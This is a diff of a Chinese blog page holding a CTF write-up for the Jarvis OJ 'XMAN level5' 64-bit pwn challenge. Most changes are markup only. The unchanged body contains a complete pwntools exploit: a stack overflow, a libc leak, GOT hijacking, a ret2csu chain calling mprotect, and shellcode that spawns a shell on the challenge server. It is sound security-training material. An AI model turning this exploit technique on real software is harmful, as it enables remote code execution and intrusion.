@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="CTF,Pwn">
-    <meta name="description" content="题目信息 mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。 nc pwn2.jarvisoj.com 9884 附件同level3_x64  那么基础信息直接使用之前的 64位elf，只开了NX，并且给出了libc文件  静态分析IDA F5，首先看elf文件，和level3一样，明显的溢出，但程序中没有直接的system和”">
+    <meta name="description" content="题目信息 mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。 nc pwn2.jarvisoj.com 9884 附件同level3_x64  那么基础信息直接使用之前的 64位elf，只开了NX，并且给出了libc文件">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XMAN level5">
 <meta property="og:url" content="https://darkwing.moe/2019/05/21/XMAN-level5/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="题目信息 mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。 nc pwn2.jarvisoj.com 9884 附件同level3_x64  那么基础信息直接使用之前的 64位elf，只开了NX，并且给出了libc文件  静态分析IDA F5，首先看elf文件，和level3一样，明显的溢出，但程序中没有直接的system和”">
+<meta property="og:description" content="题目信息 mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。 nc pwn2.jarvisoj.com 9884 附件同level3_x64  那么基础信息直接使用之前的 64位elf，只开了NX，并且给出了libc文件">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051709.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051710.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051711.jpg">
@@ -127,7 +127,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -219,13 +219,48 @@
 </blockquote>
 <p>那么基础信息直接使用之前的</p>
 <p>64位elf，只开了NX，并且给出了libc文件</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051709.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051709.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>IDA F5，首先看elf文件，和level3一样，明显的溢出，但程序中没有直接的system和”/bin/sh”</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051710.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051711.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051712.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051710.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051711.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051712.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>给出的libc文件中有这两个</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051713.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051713.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p><del>那么思路就和level3类似，leak之后计算地址，执行system</del></p>
 <p>题目要求使用mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。</p>
 <p>区别同样只在于32位和64位的栈上</p>
@@ -245,14 +280,35 @@
 <ul>
 <li>_libc_csu_init函数是程序调用libc库用来对程序进行初始化的函数，一般先于main函数执行</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052008.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052009.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052008.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052009.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level5'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9884</span>)</span><br><span class="line"><span class="comment"># sh = process('./level5')</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">vuln_func = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line">write_libc = libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line">pop_rdi = <span class="number">0x00000000004006b3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004006b1</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'A'</span> * <span class="number">0x88</span></span><br><span class="line">payload1 += p64(pop_rsi_r15) + p64(write_got) + p64(<span class="number">0</span>)</span><br><span class="line">payload1 += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(write_plt)</span><br><span class="line"><span class="comment"># hijack __libc_start_main -&gt; mprotect</span></span><br><span class="line">mprotect_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">payload1 += p64(pop_rsi_r15) + p64(mprotect_got) + p64(<span class="number">0</span>)</span><br><span class="line">payload1 += p64(pop_rdi) + p64(<span class="number">0</span>)</span><br><span class="line">payload1 += p64(read_plt)</span><br><span class="line"><span class="comment"># read shellcode from stdin to bss</span></span><br><span class="line">payload1 += p64(pop_rsi_r15) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload1 += p64(read_plt)</span><br><span class="line"><span class="comment"># hijack __gmon_start__ -&gt; bss_shellcode</span></span><br><span class="line">bss_got = elf.got[<span class="string">'__gmon_start__'</span>]</span><br><span class="line">payload1 += p64(pop_rsi_r15) + p64(bss_got) + p64(<span class="number">0</span>)</span><br><span class="line">payload1 += p64(read_plt)</span><br><span class="line">payload1 += p64(elf.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">sh.recv()  <span class="comment"># 'Input:\n'</span></span><br><span class="line">sh.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = write_addr - write_libc</span><br><span class="line">libc_mprotect = libc.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">mprotect_addr = libc_base + libc_mprotect</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">sh.send(p64(mprotect_addr))</span><br><span class="line">pause()</span><br><span class="line">sh.send(shellcode)</span><br><span class="line">pause()</span><br><span class="line">sh.send(p64(bss_addr))</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x400690 &lt;__libc_csu_init+64&gt;:	mov    rdx,r13</span></span><br><span class="line"><span class="string">0x400693 &lt;__libc_csu_init+67&gt;:	mov    rsi,r14</span></span><br><span class="line"><span class="string">0x400696 &lt;__libc_csu_init+70&gt;:	mov    edi,r15d</span></span><br><span class="line"><span class="string">0x400699 &lt;__libc_csu_init+73&gt;:	call   QWORD PTR [r12+rbx*8]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4006a6 &lt;__libc_csu_init+86&gt;:	add    rsp,0x8</span></span><br><span class="line"><span class="string">0x4006aa &lt;__libc_csu_init+90&gt;:	pop    rbx</span></span><br><span class="line"><span class="string">0x4006ab &lt;__libc_csu_init+91&gt;:	pop    rbp</span></span><br><span class="line"><span class="string">0x4006ac &lt;__libc_csu_init+92&gt;:	pop    r12</span></span><br><span class="line"><span class="string">0x4006ae &lt;__libc_csu_init+94&gt;:	pop    r13</span></span><br><span class="line"><span class="string">0x4006b0 &lt;__libc_csu_init+96&gt;:	pop    r14</span></span><br><span class="line"><span class="string">0x4006b2 &lt;__libc_csu_init+98&gt;:	pop    r15</span></span><br><span class="line"><span class="string">0x4006b4 &lt;__libc_csu_init+100&gt;:	ret</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'A'</span> * <span class="number">0x88</span></span><br><span class="line">payload2 += p64(<span class="number">0x4006a6</span>)</span><br><span class="line">payload2 += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload2 += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">payload2 += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line"><span class="comment"># r12-&gt;addr &gt;&gt; call mprotect to set 0x600000(rw-p) to rwxp so shellcode can be execute</span></span><br><span class="line">payload2 += p64(elf.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">payload2 += p64(<span class="number">7</span>)  <span class="comment"># r13 = rdx</span></span><br><span class="line">payload2 += p64(<span class="number">0x1000</span>)  <span class="comment"># r14 = rsi</span></span><br><span class="line">payload2 += p64(<span class="number">0x00600000</span>)  <span class="comment"># edi bss:0000000000600a88</span></span><br><span class="line">payload2 += p64(<span class="number">0x400690</span>)</span><br><span class="line">payload2 += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload2 += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">payload2 += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line">payload2 += p64(elf.got[<span class="string">'__gmon_start__'</span>])  <span class="comment"># r12-&gt;addr &gt;&gt; call shellcode</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)  <span class="comment"># r13-&gt;rdx</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)  <span class="comment"># r14-&gt;rsi</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)  <span class="comment"># r15-&gt;edi</span></span><br><span class="line">payload2 += p64(<span class="number">0x400690</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()  <span class="comment"># 'Input:\n'</span></span><br><span class="line">pause()</span><br><span class="line">sh.send(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>因为是<code>call   QWORD PTR [r12+rbx*8]</code>，调用的指针，所以需要劫持GOT，不能直接使用地址</li>
 </ul>
-<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052010.jpg" alt=""></p>
+<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052010.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 
         </div>
 
